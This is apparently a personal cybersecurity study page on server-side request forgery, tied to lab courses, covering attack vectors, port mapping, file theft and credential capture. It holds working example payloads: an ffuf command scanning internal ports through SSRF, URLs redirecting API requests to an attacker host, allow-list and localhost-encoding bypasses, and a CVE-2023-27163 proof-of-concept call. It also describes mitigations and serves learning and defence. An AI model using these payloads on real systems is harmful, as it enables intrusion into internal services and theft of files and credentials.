# Server-Side Request Forgery (SSRF)

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![modern_web_exploitation_techniques](../../../../_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)
[![adventofcyber2](../../../../_badges/thm/adventofcyber2/day19.svg)](https://tryhackme.com/room/adventofcyber2)
[![testingforssrf](../../../../_badges/owasp/testingforssrf.svg)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)
[![server_side_request_forgery](../../../../_badges/poat/server_side_request_forgery.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

<div class="row row-cols-lg-2"><div>

Server-Side Request Forgery (SSRF) is an attack in which a hacker can make a server request something from another server, usually an internal server or an API.

From instance, a website using an API. If there is a SSRF vulnerability, the hacker may be able to query the API by exploiting the website.

Common attack vectors

* üìö Headers <small>(mostly User-Agent)</small>
* üìÑ Forms <small>(internal API calls)</small>
* üç™ Cookies
* üåç Remote connections <small>(imports, file processing, etc.)</small>
</div><div>

Common usages are:

* üó∫Ô∏è Port mapping
* üó∫Ô∏è Access internal services
* üí∞ Steal sensitive data
* üí• Perform a DoS

There are two kinds of SSRF

* **Regular/in-band SSRF**: the client will see the result
* **Blind/out-band SSRF**: nothing is returned to the client

Refer to [request grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch requests.
</div></div>

<hr class="sep-both">

## SSRF Attack Vectors

<div class="row row-cols-lg-2"><div>

#### Remote URL Access

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![surfer](../../../../_badges/thm-p/surfer.svg)](https://tryhackme.com/r/room/surfer)

The most common scenario is when a website requests an external resources using user input, such as an external avatar URL.

A common scenario is a [PHP](/programming-languages/web/php/_general/index.md) call to `file_get_contents` to access a remote file. You have similar functions in other languages.

You may be able to:

* Map ports/services üó∫Ô∏è
* Steal files üí∞

#### Remote API Endpoint Access

[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)

If a website is making a request to an external API based on a endpoint controlled by the user, we may be able to access another unintended endpoint. Ex: `website.a/?api=path` $\to$ `website.b/path`.

You may be able to:

* Access unintended API endpoints üõ£Ô∏è
</div><div>

#### Remote API Access

[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)

If the programmer is using user input to determine which server will be queried, then the hacker may try to send the request to their servers instead, and get the API credentials inside the headers.

Ex: `a?api=xxx&r=path` $\to$ `xxx.b/path`

* We send the request to `https://xxx.thebestapi.example/path`
* If `api=malicious_website.com?&ignore=`, then the URL crafted is `https://malicious_website.com?&ignore=.thebestapi.com/path`!

You may be able to:

* Steal API tokens/credentials üíµ
</div></div>

<hr class="sep-both">

## SSRF Exploitation

<div class="row row-cols-lg-2"><div>

#### Mapping ports/services üó∫Ô∏è

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)

You may inject URLs such as `http://localhost:22` to test if the port `22` is open. You can use fuzzing to enumerate all ports:

```ps
$ seq 1 65535 > ports.txt
$ ffuf -w ports.txt -u 'http://IP/?xxx=http://127.0.0.1:FUZZ' -fr 'Connection refused'
```

You could also make the server call `http://ifconfig.pro/` to get some information <small>(IP, DNS...)</small> to perform more advanced attacks.
</div><div>

#### Access Internal Services üó∫Ô∏è

[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)
[![surfer](../../../../_badges/thm-p/surfer.svg)](https://tryhackme.com/r/room/surfer)

You may be able to query internal IPs or internal websites.

#### Steal files üí∞

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)

You may inject URLs to steal a file. For instance, a URL using the file protocol: `file://some/file/on/the/target`.

* [List of interesting files](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/arbitrary_file_access.md)
* You could also try to connect to your FTP server using `ftp://`.
</div></div>

<hr class="sep-both">

## Mitigations üõ°Ô∏è

[![modern_web_exploitation_techniques](../../../../_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)

<div class="row row-cols-lg-2"><div>

#### SSRF Mitigations ‚Äî Overview

You should use strong access controls, network segmentation and firewalls, logging and monitoring to support input validation.


#### SSRF Mitigations ‚Äî Allow List

We define a set of allowed URLs/resources. It can be bypassed  if the condition is too lax such as `"The URL must start with https://example.com"` which can be bypassed with:

* `https://example.com.malicious.website`
* `https://example.com@malicious.website`

Usually, we want to avoid manipulating URLs and instead determine the URL to use from the user input. It's not always possible.
</div><div>

#### SSRF Mitigations ‚Äî Deny List

We define a set of forbidden URLs/resources while allowing every other. For instance, we allow every IP aside from  `127.0.0.1` and `169.254.169.254`. It can be bypassed too.

All of these addresses may resolve to, or are resolving to, `127.0.0.1`.

*  `0`, `00`, `000[...]0`, `0.0.0.0` (any IP, which may be localhost)
* `2130706433` (decimal), `017700000001` (octal), `0x7f000001` (hex)
* `127.1` (IP shortening), `127.00[...]00.1` (IP prolonging)
* `::1`, `::ffff:127.0.0.1` (IPV6)
* [127.0.0.1.nip.io](http://127.0.0.1.nip.io), [localtest.me](http://localtest.me), [lvh.me](http://lvh.me), etc.
* ...
</div></div>

<hr class="sep-both">

## Example CVEs

<div class="row row-cols-lg-2"><div>

#### CVE-2023-27163

[![sau](../../../../_badges/htb-p/sau.svg)](https://app.hackthebox.com/machines/Sau)

CVE in [request-baskets](https://github.com/darklynx/request-baskets). [POC (shell script)](https://github.com/entr0pie/CVE-2023-27163) <small>(0.03k ‚≠ê)</small>.

```shell!
$ ./CVE-2023-27163.sh http://target:port http://listener:port 
Creating the "<backet>" proxy basket...
Basket created!
$ curl http://target:port/<backet> # sent to listener URL
```

It can be used to access a resource behind a firewall.

```ps
$ ./CVE-2023-27163.sh http://target:port http://target:fport 
```
</div><div>
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

Other attack vectors

* avatar form
* a script
* a header
* ...
</div><div>

* [Gopherus](https://github.com/tarunkant/Gopherus)
* [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
</div></div>